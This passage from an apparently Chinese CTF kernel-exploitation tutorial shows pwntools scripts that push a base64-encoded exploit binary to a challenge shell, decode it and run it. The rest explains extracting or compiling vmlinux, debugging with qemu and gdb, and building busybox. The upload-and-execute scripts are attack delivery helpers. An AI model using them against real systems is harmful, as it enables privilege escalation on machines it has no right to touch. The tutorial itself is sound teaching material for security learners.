class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">11451</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./boot.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 5555)</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exploit&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x ./exploit;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exploit&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="获取-vmlinux">获取 vmlinux</h2>
<p>由于 bzImage 是压缩过的内核镜像，因此需要获取未经压缩的
<code>vmlinux</code> 镜像用于提供调试符号，以及查找 gadget
和关键结构偏移。</p>
<p>下面提供几个获取 vmlinux 的方法。</p>
<h3 id="编译内核">编译内核</h3>
<p><strong>注意，即使题目提供了 config 文件，编译出的 vmlinux
中各结构的偏移也不一定与题目提供的 bzImage 相同。编译出的 vmlinux
只是在计算结构体中成员偏移起参考作用，gadget 等涉及在内核中偏移的还是在
vmlinux-to-elf 解压的 vmlinux 中找。</strong> <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f2f96c222f1119bae1840b4b1ff095bf.png"
                     
                      
                
                ></p>
<p>编译内核的好处是可以配置编译文件，并且可以编译出带调试符号的文件，gdb
调试的时候可以查看源码。 为了方便调试，需要从这个<a class="link" 
 target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >网站<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>下载与题目所给内核版本相同的内核源码并编译出带调试符号的内核文件。</p>
<p>首先查看题目所给内核版本 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c93f022e123582a73f61518d69b88fa2.png"
                     
                      
                
                >
下载对应版本内核并解压 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/51cb330151299d66bf3881b7aa81cc54.png"
                     
                      
                
                >
查看题目所给内核编译时使用的 gcc 版本 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4474952c80dbb804309d2bc6a50287e4.png"
                     
                      
                
                >
<strong>由于编译该内核的所需的 gcc-5 已经无法在 ubuntu 18.04
及以上版本系统中下载安装，因此编译该内核需要再 ubuntu 16.04
中进行。</strong> 下面的图中的操作之所以是在高版本 ubuntu
中进行是因为当时是可以的。</p>
<p>输入命令，查看 gcc-5 可选的版本</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy gcc-5</span><br></pre></td></tr></table></figure></div>
<p>找到了与编译题目内核的 gcc 比较接近的版本（这里我已经安装过了） <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/45da6ddd31759a9cc29edb9e1fc2c575.png"
                     
                      
                
                > 安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5=5.4.0-6ubuntu1~16.04.12</span><br></pre></td></tr></table></figure></div>
<p>更新到 update-alternatives 上（参考<a class="link" 
 target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/124440184" >编译
ollvm<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i> 时 gcc 版本的设置）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 5</span><br></pre></td></tr></table></figure></div>
<p>切换到 gcc-5 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f0b1c1b6aadf1eba53a3755458240f63.png"
                     
                      
                
                > <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8032fcd09424f9f59736d97d9f23de25.png"
                     
                      
                
                ></p>
<p>之后编辑配置文件，在 linux-4.4.72 目录下输入</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<p>保证勾选如下配置（默认都是勾选了的）：</p>
<ul>
<li>Kernel hacking —&gt; Kernel debugging</li>
<li>Kernel hacking —&gt; Compile-time checks and compiler options —&gt;
Compile the kernel with debug info</li>
<li>Kernel hacking —&gt; Generic Kernel Debugging Instruments –&gt;
KGDB: kernel debugger</li>
<li>kernel hacking —&gt; Compile the kernel with frame pointers</li>
</ul>
<p>一般来说不需要有什么改动，直接保存退出即可。</p>
<p>设置保存在 <code>.config</code> 文件中。
为了防止后面编译报下面这个错</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make: *** [Makefile:1868: certs] Error 2</span><br></pre></td></tr></table></figure></div>
<p>需要编辑 <code>.config</code> 文件，直接把下面这个字符串删掉。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0e45c44c3822f545cfa2067a616acf76.png"
                     
                      
                
                >
之后编译可能还会缺少一些依赖，为了尽可能一次成功，先把下面这些装一下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br><span class="line">sudo apt install libelf-dev </span><br><span class="line">sudo apt install libssl-dev</span><br><span class="line">sudo apt install dwarves</span><br><span class="line">sudo apt install zstd</span><br></pre></td></tr></table></figure></div>
<p>之后运行下面这条命令进行编译</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j4</span><br></pre></td></tr></table></figure></div>
<p>最后生成的 vmlinux 。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/638d83d2f81585a9fec3f2f9c2e655d8.png"
                     
                      
                
                ></p>
<h3 id="vmlinux-to-elf">vmlinux-to-elf</h3>
<p>此工具允许从 vmlinux/vmlinuz/bzImage/zImage 内核映像获取完全可分析的
.ELF 文件，其中包含恢复的函数和变量符号。</p>
<p>安装：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>
<p>使用方法：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>
<p>与后面两个方法相比，这个方法获取的 vmlinux
带调试符号，不过结构体相关的调试符号只有编译内核可以获得。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a4a9e1beefc8b080d8988819ab67e61a.png"
                     
                      
                
                ></p>
<h3 id="下载镜像">下载镜像</h3>
<p>有的内核题可以直接下载下载现有镜像 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d344b50a2b60fe8ed41cfd6e05923cd0.png"
                     
                      
                
                >
使用如下命令列出可下载内核镜像</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search linux-image-</span><br></pre></td></tr></table></figure></div>
<p>找到对应版本 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/597ff6c86dbd147d99dcb311abf66cee.png"
                     
                      
                
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt download linux-image-unsigned-5.8.0-59-generic</span><br></pre></td></tr></table></figure></div>
<p>下载下来是一个<code>deb</code>文件，解压有</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X ./linux-image-unsigned-5.8.0-59-generic_5.8.0-59.66~20.04.1_amd64.deb extract</span><br></pre></td></tr></table></figure></div>
<p>文件如下</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── boot</span><br><span class="line">│   └── vmlinuz-5.8.0-59-generic</span><br><span class="line">└── usr</span><br><span class="line">    ├── lib</span><br><span class="line">    │   └── linux</span><br><span class="line">    │       └── triggers</span><br><span class="line">    └── share</span><br><span class="line">        └── doc</span><br><span class="line">            └── linux-image-unsigned-5.8.0-59-generic</span><br><span class="line">                ├── changelog.Debian.gz</span><br><span class="line">                └── copyright</span><br><span class="line"></span><br><span class="line">8 directories, 3 files</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>vmlinuz-5.8.0-59-generic</code> 是压缩版的镜像，需要解压出
vmlinux 。 首先获取 <code>1f 8b 08 00</code> 的偏移：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -t x1 -A d vmlinuz-5.8.0-59-generic | grep &quot;1f 8b 08 00&quot;</span><br></pre></td></tr></table></figure></div>
<p>解压，其中 skip 的值为 <code>1f 8b 08 00</code> 的偏移。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=vmlinuz-5.8.0-59-generic bs=1 skip=16808|zcat&gt;vmlinux</span><br></pre></td></tr></table></figure></div>
<h3 id="bzimage-解压">bzImage 解压</h3>
<p>使用 <a class="link" 
 target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" >extract-vmlinux<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
脚本从 bzImage 获取 vmlinux 。 脚本不长，直接在下面贴一下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Use readelf to check <span class="keyword">if</span> it<span class="string">&#x27;s a valid ELF</span></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">      and not just an elf</span></span><br><span class="line">	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">The obscure use of the <span class="string">&quot;tr&quot;</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash"><span class="string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">	for	pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">	do</span><br><span class="line">		pos=$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure></div>
<p>运行如下命令就可以解压出 vmlinux 了。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>
<p>更快捷的方法是直接用 <code>vmlinux-to-elf</code>
解压，还可以顺便修复符号。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure></div>
<h2 id="gdb-调试">gdb 调试</h2>
<p>首先需要对 <code>boot.sh</code> 做如下修改：</p>
<ul>
<li>添加 <code>nokaslr</code> 关闭地址随机化。</li>
<li>添加 <code>-s</code>，因为 qemu
其实提供了调试内核的接口，我们可以在启动参数中添加 -gdb dev
来启动调试服务。最常见的操作为在一个端口监听一个 tcp 连接。 QEMU
同时提供了一个简写的方式 -s，表示 -gdb tcp::1234，即在 1234 端口开启一个
gdbserver。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure></div>
<p>为了加载 <code>babydriver.ko</code>
的符号信息，需要获取其代码段的地址。因此需要修改 <code>init</code>
内容获取 root 权限。</p>
<p>重新打包并启动系统，查询代码段地址。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2076d182b0b38f6a5f47d225d016d4f7.png"
                     
                      
                
                > 另外
<code>lsmod</code> 也可以查询模块加载基址。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e7b00cb989747e1f58362f34e2224339.png"
                     
                      
                
                > 创建
<code>gdb.sh</code> 调试脚本，</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex &quot;file $(find . -name vmlinux)&quot; \</span><br><span class="line">  -ex &quot;add-symbol-file $(find . -name babydriver.ko) 0xffffffffc0000000&quot; \</span><br><span class="line">  -ex &quot;target remote localhost:1234&quot; \</span><br><span class="line">  -ex &quot;b babyopen&quot; \</span><br><span class="line">  -ex &quot;c&quot;</span><br></pre></td></tr></table></figure></div>
<p>运行 <code>boot.sh</code> 启动 linux ，运行 <code>gdb.sh</code>
附加到 linux，之后运行 exp，成功在断点处断下来。（注意，只有使用 root
权限启动的 gdb 才可以 vmmap 查看内存页映射情况） <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a9b8f88b5a7e5d56fdee54ec2c45b3e1.png"
                     
                      
                
                ></p>
<h2 id="编译-busybox">编译 busybox</h2>
<p>这个不是做内核题所需的步骤，只是介绍一下内核 pwn
中的文件系统是怎么来的。因为题目提供的文件系统有相关的配置文件，因此以题目提供的文件系统为准。</p>
<p>kernel 题一般采用的是轻量化的 busybox 文件系统。</p>
<p>在<a class="link"   target="_blank" rel="noopener" href="https://busybox.net/" >官网<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>下载 busybox
源码并解压。</p>
<p>之后安装依赖：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev libncursesw5-dev</span><br></pre></td></tr></table></figure></div>
<p>在 busybox 目录下输入如下命令进入图形界面配置编译选项。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<p>进入 Settings <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b6d522ba4619e691b4fb0cfcd591140.png"
                     
                      
                
                ></p>
<p>选择静态编译。如果不勾选的话，需要自行配置libc库，这样步骤会很繁琐。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6369190069fbdb7c6d09f5af41267f25.png"
                     
                      
                
                > 设置安装目录
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/71fe45733009242d8fdb603a12b1710d.png"
                     
                      
                
                >
这里我们选择的是 <code>./rootfs</code> <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/10e0b8440708ff61cee73ed24699e64b.png"
                     
                      
                
                > 最后保存并退出。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4e79d34af1408f9d75a62383a6f55081.png"
                     
                      
                
                > 编译文件</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>可以看到生成了 <code>rootfs</code> 文件夹，这就是编译好的文件系统。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8cb0bf19e0c73e4bb3bffe8239f07caa.png"
                     
                      
                
                ></p>
